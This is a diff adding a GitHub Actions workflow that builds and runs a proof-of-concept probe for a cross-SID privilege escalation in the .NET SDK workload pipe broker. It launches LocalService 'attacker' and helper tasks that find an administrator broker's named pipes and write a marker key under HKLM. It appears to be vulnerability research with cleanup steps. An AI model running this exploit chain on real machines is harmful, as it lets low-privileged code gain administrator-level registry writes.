@@ -1,0 +1,145 @@
+name: SDK workload pipe cross-SID EoP
+
+on:
+  push:
+    branches:
+      - research/dotnet-sdk-workload-pipe-pid-binding-20260921
+  pull_request:
+    branches:
+      - main
+  workflow_dispatch:
+
+jobs:
+  cross-sid:
+    runs-on: windows-latest
+    timeout-minutes: 15
+    steps:
+      - uses: actions/checkout@v4
+
+      - uses: actions/setup-dotnet@v4
+        with:
+          dotnet-version: 10.0.401
+
+      - name: Build cross-SID probe
+        shell: pwsh
+        run: |
+          if (Test-Path global.json) { Remove-Item global.json -Force }
+          dotnet --version
+          dotnet build research/sdk-workload-pipe-pid-binding/PipeHijackProbe.csproj -c Release
+
+      - name: Stage probe for LocalService
+        shell: pwsh
+        run: |
+          $stage = 'C:\Users\Public\SdkPipeProbe'
+          New-Item -ItemType Directory -Path $stage -Force | Out-Null
+          Copy-Item "research\sdk-workload-pipe-pid-binding\bin\Release\net10.0\*" $stage -Recurse -Force
+          & icacls.exe $stage /grant '*S-1-5-19:(OI)(CI)M' /T /C
+          if ($LASTEXITCODE -ne 0) { throw "Failed to grant LocalService access to staged probe" }
+
+      - name: Run LocalService to administrator broker boundary proof
+        shell: pwsh
+        run: |
+          $ErrorActionPreference = 'Stop'
+          $stage = 'C:\Users\Public\SdkPipeProbe'
+          $dll = Join-Path $stage 'PipeHijackProbe.dll'
+          $dotnet = (Get-Command dotnet).Source
+          $helperInfo = Join-Path $stage 'helper.txt'
+          $serverPidFile = Join-Path $stage 'serverpid.txt'
+          $attackerEvidence = Join-Path $stage 'attacker.txt'
+          $brokerOut = Join-Path $stage 'broker.out.txt'
+          $brokerErr = Join-Path $stage 'broker.err.txt'
+          $helperTask = 'SdkPipeResearchHelper'
+          $attackerTask = 'SdkPipeResearchAttacker'
+          $broker = $null
+
+          function Wait-File([string]$path, [int]$seconds) {
+            for ($i = 0; $i -lt ($seconds * 5); $i++) {
+              if (Test-Path $path) { return }
+              Start-Sleep -Milliseconds 200
+            }
+            throw "Timed out waiting for $path"
+          }
+
+          try {
+            schtasks.exe /Delete /TN $helperTask /F 2>$null | Out-Null
+            schtasks.exe /Delete /TN $attackerTask /F 2>$null | Out-Null
+
+            $helperCommand = '"' + $dotnet + '" "' + $dll + '" ots-helper "' + $helperInfo + '"'
+            & schtasks.exe /Create /TN $helperTask /TR $helperCommand /SC ONCE /ST 23:59 /RU 'NT AUTHORITY\LOCAL SERVICE' /F
+            if ($LASTEXITCODE -ne 0) { throw "Unable to create LocalService helper task" }
+            & schtasks.exe /Run /TN $helperTask
+            if ($LASTEXITCODE -ne 0) { throw "Unable to start LocalService helper task" }
+
+            Wait-File $helperInfo 10
+            Get-Content $helperInfo
+            $helperPidLine = Get-Content $helperInfo | Where-Object { $_ -like 'OTS_HELPER_PID=*' } | Select-Object -First 1
+            if (-not $helperPidLine) { throw "Helper PID evidence missing" }
+            $helperPid = [int]($helperPidLine.Split('=')[1])
+
+            $broker = Start-Process -FilePath $dotnet -ArgumentList @(
+              $dll,
+              'ots-broker-parent-only',
+              $helperPid.ToString(),
+              $serverPidFile
+            ) -PassThru -RedirectStandardOutput $brokerOut -RedirectStandardError $brokerErr
+
+            Wait-File $serverPidFile 10
+            $serverPid = [int](Get-Content $serverPidFile -Raw)
+            Write-Host "WORKFLOW_HELPER_PID=$helperPid"
+            Write-Host "WORKFLOW_SERVER_PID=$serverPid"
+
+            # Do not pass the broker PID to the attacker. It receives only the expected
+            # parent PID and target SDK major, then discovers the broker from local process state.
+            $attackerCommand = '"' + $dotnet + '" "' + $dll + '" ots-attacker-scan ' + $helperPid + ' 10 "' + $attackerEvidence + '"'
+            & schtasks.exe /Create /TN $attackerTask /TR $attackerCommand /SC ONCE /ST 23:59 /RU 'NT AUTHORITY\LOCAL SERVICE' /F
+            if ($LASTEXITCODE -ne 0) { throw "Unable to create LocalService attacker task" }
+            & schtasks.exe /Run /TN $attackerTask
+            if ($LASTEXITCODE -ne 0) { throw "Unable to start LocalService attacker task" }
+
+            Wait-File $attackerEvidence 15
+            for ($i = 0; $i -lt 75; $i++) {
+              $e = Get-Content $attackerEvidence -Raw -ErrorAction SilentlyContinue
+              if ($e -match 'ELEVATED_BROKER_PRIVILEGE_BYPASS=') { break }
+              Start-Sleep -Milliseconds 200
+            }
+
+            Write-Host '=== HELPER IDENTITY ==='
+            Get-Content $helperInfo
+            Write-Host '=== BROKER LAUNCH ==='
+            Get-Content $brokerOut -ErrorAction SilentlyContinue
+            Get-Content $brokerErr -ErrorAction SilentlyContinue
+            Write-Host '=== ATTACKER EVIDENCE ==='
+            Get-Content $attackerEvidence -ErrorAction SilentlyContinue
+
+            $helperText = Get-Content $helperInfo -Raw
+            $brokerText = (Get-Content $brokerOut -Raw -ErrorAction SilentlyContinue)
+            $attackText = Get-Content $attackerEvidence -Raw
+
+            if ($helperText -notmatch 'OTS_HELPER_SID=S-1-5-19') { throw "Helper was not LocalService" }
+            if ($brokerText -notmatch 'OTS_BROKER_LAUNCHER_IS_ADMIN=True') { throw "Broker launcher was not administrator" }
+            if ($attackText -notmatch 'OTS_ATTACKER_SID=S-1-5-19') { throw "Attacker was not LocalService" }
+            if ($attackText -notmatch 'ATTACKER_DIRECT_HKLM_WRITE_ALLOWED=False') { throw "Direct HKLM negative control failed" }
+            if ($attackText -notmatch 'SERVER_PID_HANDOFF=False') { throw "Attacker unexpectedly received broker PID" }
+            if ($attackText -notmatch 'DISPATCH_PIPE_DISCOVERED_AND_CONNECTED=True') { throw "Attacker did not discover dispatcher pipe" }
+            if ($attackText -notmatch 'LOG_PIPE_DISCOVERED_AND_CONNECTED=True') { throw "Attacker did not discover logger pipe" }
+            if ($attackText -notmatch 'BROKER_DISCOVERY_WITHOUT_PID_HANDOFF=CONFIRMED') { throw "PID-free broker discovery did not confirm" }
+            if ($attackText -notmatch 'HKLM_MARKER_CREATED=True') { throw "Elevated HKLM mutation did not occur" }
+            if ($attackText -notmatch 'HKLM_MARKER_CLEANED=True') { throw "Marker cleanup did not complete" }
+            if ($attackText -notmatch 'ELEVATED_BROKER_PRIVILEGE_BYPASS=CONFIRMED') { throw "Cross-SID privilege proof did not confirm" }
+
+            Write-Host 'SDK_WORKLOAD_PIPE_CROSS_SID_EOP=CONFIRMED'
+          }
+          finally {
+            try { schtasks.exe /End /TN $attackerTask 2>$null | Out-Null } catch {}
+            try { schtasks.exe /End /TN $helperTask 2>$null | Out-Null } catch {}
+            try { schtasks.exe /Delete /TN $attackerTask /F 2>$null | Out-Null } catch {}
+            try { schtasks.exe /Delete /TN $helperTask /F 2>$null | Out-Null } catch {}
+            if ($broker -and -not $broker.HasExited) {
+              try { Stop-Process -Id $broker.Id -Force -ErrorAction SilentlyContinue } catch {}
+            }
+            try {
+              Remove-Item 'HKLM:\SOFTWARE\Microsoft\dotnet\InstalledWorkloads\Standalone\x64\10.0.100\research.pipe-hijack.marker' -Recurse -Force -ErrorAction SilentlyContinue
+              Remove-Item 'HKLM:\SOFTWARE\Microsoft\dotnet\InstalledWorkloads\Standalone\x64\10.0.100\research.pipe-hijack.direct-attacker' -Recurse -Force -ErrorAction SilentlyContinue
+            } catch {}
+            try { Remove-Item $stage -Recurse -Force -ErrorAction SilentlyContinue } catch {}
+          }
